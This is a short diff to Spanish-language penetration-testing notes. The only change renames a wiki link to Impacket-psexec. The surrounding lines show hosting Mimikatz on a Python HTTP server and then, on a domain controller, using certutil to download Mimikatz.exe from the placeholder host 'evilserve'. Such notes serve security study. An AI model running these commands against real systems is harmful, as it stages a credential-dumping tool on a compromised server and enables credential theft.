@@ -6,7 +6,7 @@ Primero tenemos que hacer un servidor para hostear nuestro archivo Mmikatz, el c
 sudo python3 -m http.server 1234
 ```
 
-Ahora desde el DC vamos a descargarnos la herramienta (Para acceder al DC de forma remota mirar [[psexec]]):
+Ahora desde el DC vamos a descargarnos la herramienta (Para acceder al DC de forma remota mirar [[Impacket-psexec]]):
 
 ``` Python
 certutil -urlcache -split -f http://evilserve:1234/Mimikatz.exe Mimikatz.exe
